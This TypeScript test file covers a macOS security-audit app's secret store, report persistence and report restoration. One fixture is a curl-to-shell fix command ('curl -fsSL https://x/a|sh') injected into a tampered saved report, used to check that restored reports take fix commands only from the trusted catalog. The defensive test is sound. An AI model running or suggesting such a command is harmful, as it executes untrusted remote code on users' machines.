import { invoke } from "@tauri-apps/api/core";
import { MACOS_CATALOG, type FixCommand, type RuleResult } from "@talos/core";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { FileReportStore, restoreReport } from "./file-report-store";
import { KeychainSecretStore } from "./keychain-secret-store";
import { openSettingsPane } from "./settings-pane";
import { TEST_REPORT } from "./test-fixtures";

vi.mock("@tauri-apps/api/core", () => ({ invoke: vi.fn() }));

const invokeMock = vi.mocked(invoke);

beforeEach(() => {
  invokeMock.mockReset();
});

describe("KeychainSecretStore", () => {
  it("reads, writes and deletes through the secret commands", async () => {
    const store = new KeychainSecretStore();
    invokeMock.mockResolvedValueOnce("sk-ant-test");
    expect(await store.get("anthropic_api_key")).toBe("sk-ant-test");
    expect(invokeMock).toHaveBeenCalledWith("secret_get", { name: "anthropic_api_key" });

    await store.set("anthropic_api_key", "sk-ant-new");
    expect(invokeMock).toHaveBeenCalledWith("secret_set", { name: "anthropic_api_key", value: "sk-ant-new" });

    await store.delete("anthropic_api_key");
    expect(invokeMock).toHaveBeenCalledWith("secret_delete", { name: "anthropic_api_key" });
  });

  it("treats null and empty values as absent", async () => {
    const store = new KeychainSecretStore();
    invokeMock.mockResolvedValueOnce(null);
    expect(await store.get("anthropic_api_key")).toBeNull();
    invokeMock.mockResolvedValueOnce("");
    expect(await store.get("anthropic_api_key")).toBeNull();
  });
});

function rule(ruleId: string) {
  const found = MACOS_CATALOG.rules.find((r) => r.id === ruleId);
  if (found === undefined) throw new Error(`no rule ${ruleId}`);
  return found;
}

const CURL: FixCommand = {
  program: "curl",
  args: ["-fsSL", "https://x/a|sh"],
  needsAdmin: true,
  interactive: false,
  appliesTo: null,
};

describe("FileReportStore", () => {
  it("saves the report and serves it from memory afterwards", async () => {
    const store = new FileReportStore(MACOS_CATALOG);
    invokeMock.mockResolvedValueOnce(undefined);
    await store.saveLast(TEST_REPORT);
    expect(invokeMock).toHaveBeenCalledWith("report_save_last", { report: TEST_REPORT });
    expect(await store.current()).toBe(TEST_REPORT);
    expect(invokeMock).toHaveBeenCalledTimes(1);
  });

  it("loads the last report from disk, rebuilding findings from the catalog", async () => {
    const store = new FileReportStore(MACOS_CATALOG);
    invokeMock.mockResolvedValueOnce(TEST_REPORT);
    const loaded = await store.loadLast();
    expect(loaded).not.toBeNull();
    expect(loaded?.reportId).toBe(TEST_REPORT.reportId);
    expect(loaded?.score).toEqual(TEST_REPORT.score);
    expect(loaded?.results.map((r) => [r.ruleId, r.status, r.points])).toEqual(
      TEST_REPORT.results.map((r) => [r.ruleId, r.status, r.points]),
    );
    expect(loaded?.findings.map((f) => f.ruleId)).toEqual(TEST_REPORT.findings.map((f) => f.ruleId));
    for (const finding of loaded?.findings ?? []) {
      const catalogRule = rule(finding.ruleId);
      expect(finding.title).toBe(catalogRule.title);
      expect(finding.explanation).toBe(catalogRule.explanation);
      expect(finding.fix).toBe(catalogRule.fix);
      expect(finding.severity).toBe(catalogRule.severity);
    }
    expect(await store.current()).toBe(loaded);
  });

  it("ignores malformed data", async () => {
    const store = new FileReportStore(MACOS_CATALOG);
    invokeMock.mockResolvedValueOnce({ hello: "world" });
    expect(await store.loadLast()).toBeNull();
    invokeMock.mockResolvedValueOnce(null);
    expect(await store.loadLast()).toBeNull();
  });

  it("current() falls back to disk and swallows a read failure", async () => {
    const store = new FileReportStore(MACOS_CATALOG);
    invokeMock.mockRejectedValueOnce("no such file");
    expect(await store.current()).toBeNull();
  });
});

describe("restoreReport", () => {
  it("never takes fix commands or text from the file", () => {
    const first = TEST_REPORT.findings[0]!;
    const tampered = {
      ...TEST_REPORT,
      findings: [{ ...first, title: "Run this", explanation: "Paste it in Terminal.", fix: { ...first.fix, commands: [CURL] } }],
    };
    const restored = restoreReport(MACOS_CATALOG, tampered);
    const finding = restored?.findings.find((f) => f.ruleId === first.ruleId);
    expect(finding?.fix).toBe(rule(first.ruleId).fix);
    expect(finding?.title).toBe(rule(first.ruleId).title);
    expect(restored?.findings.flatMap((f) => f.fix.commands).some((c) => c.program === "curl")).toBe(false);
  });

  it("derives findings from results, not from the persisted findings array", () => {
    const withoutFindings = { ...TEST_REPORT, findings: [] };
    expect(restoreReport(MACOS_CATALOG, withoutFindings)?.findings.map((f) => f.ruleId)).toEqual([
      "TL-MAC-001",
      "TL-MAC-002",
      "TL-MAC-023",
    ]);
  });

  it("drops evidence keys the rule does not declare", () => {
    const restored = restoreReport(MACOS_CATALOG, TEST_REPORT);
    // TL-MAC-002 declares "enabled"; TL-MAC-001 does not.
    expect(restored?.results.find((r) => r.ruleId === "TL-MAC-002")?.evidence).toEqual(
      TEST_REPORT.results.find((r) => r.ruleId === "TL-MAC-002")?.evidence,
    );
    expect(restored?.results.find((r) => r.ruleId === "TL-MAC-001")?.evidence).toEqual([]);
  });

  it("returns null when a result names a rule outside the catalog", () => {
    const stray: RuleResult = { ruleId: "TL-MAC-999", status: "fail", evidence: [], unknownReason: null, points: 8 };
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, results: [...TEST_REPORT.results, stray] })).toBeNull();
  });

  it("returns null for a malformed or duplicated result", () => {
    const good = TEST_REPORT.results[0]!;
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, results: [{ ...good, status: "owned" }] })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, results: [{ ...good, unknownReason: "nope" }] })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, results: [{ ...good, evidence: [{ key: 1 }] }] })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, results: [{ ...good, points: "8" }] })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, results: [good, good] })).toBeNull();
    expect(restoreReport(MACOS_CATALOG, { ...TEST_REPORT, results: ["TL-MAC-001"] })).toBeNull();
  });
});

describe("openSettingsPane", () => {
  it("passes the pane name only", async () => {
    invokeMock.mockResolvedValueOnce(undefined);
    await openSettingsPane("full_disk_access");
    expect(invokeMock).toHaveBeenCalledWith("open_settings_pane", { pane: "full_disk_access" });
  });
});
